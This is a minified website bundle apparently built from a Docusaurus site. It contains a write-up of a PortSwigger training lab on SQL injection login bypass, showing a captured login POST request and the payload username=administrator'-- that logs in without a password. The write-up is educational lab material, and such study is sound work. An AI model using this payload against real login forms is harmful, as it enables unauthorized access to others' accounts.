"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[6505],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return d}});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=r.createContext({}),s=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},u=function(e){var t=s(e.components);return r.createElement(l.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},f=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,u=c(e,["components","mdxType","originalType","parentName"]),f=s(n),d=i,g=f["".concat(l,".").concat(d)]||f[d]||p[d]||o;return n?r.createElement(g,a(a({ref:t},u),{},{components:n})):r.createElement(g,a({ref:t},u))}));function d(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,a=new Array(o);a[0]=f;var c={};for(var l in t)hasOwnProperty.call(t,l)&&(c[l]=t[l]);c.originalType=e,c.mdxType="string"==typeof e?e:i,a[1]=c;for(var s=2;s<o;s++)a[s]=n[s];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}f.displayName="MDXCreateElement"},5652:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return c},contentTitle:function(){return l},metadata:function(){return s},toc:function(){return u},default:function(){return f}});var r=n(7462),i=n(3366),o=(n(7294),n(3905)),a=["components"],c={},l="Lab: SQL injection vulnerability allowing login bypass",s={unversionedId:"PortSwigger/SQL Injection/Lab 02",id:"PortSwigger/SQL Injection/Lab 02",isDocsHomePage:!1,title:"Lab: SQL injection vulnerability allowing login bypass",description:"Task",source:"@site/docs/PortSwigger/SQL Injection/Lab 02.md",sourceDirName:"PortSwigger/SQL Injection",slug:"/PortSwigger/SQL Injection/Lab 02",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 02",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 02.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 01"},next:{title:"Lab: SQL injection UNION attack, determining the number of columns returned by the query",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 03"}},u=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[]}],p={toc:u};function f(e){var t=e.components,n=(0,i.Z)(e,a);return(0,o.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"lab-sql-injection-vulnerability-allowing-login-bypass"},"Lab: SQL injection vulnerability allowing login bypass"),(0,o.kt)("h2",{id:"task"},"Task"),(0,o.kt)("p",null,"This lab contains an SQL injection vulnerability in the login function."),(0,o.kt)("p",null,"To solve the lab, perform an SQL injection attack that logs in to the application as the ",(0,o.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,o.kt)("h2",{id:"solution"},"Solution"),(0,o.kt)("p",null,"The original POST request is:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'POST /login HTTP/1.1\nHost: ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net\nCookie: session=6xNPtUMzVMrP2VIW54PysQfr47RD6HwF\nContent-Length: 74\nCache-Control: max-age=0\nSec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="92"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net/login\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\ncsrf=w1HE2S5VZa0teQEU9kRtLfYbMUDOcMjl&username=administrator&password=test\n')),(0,o.kt)("p",null,"To login successfully without a valid password, the payload is modified to:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"username=administrator'--&password=test\n")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130056546-5816ff8e-6fde-4af9-a520-e8d796c96662.png",alt:"image"})),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Succeeded!")))}f.isMDXComponent=!0}}]);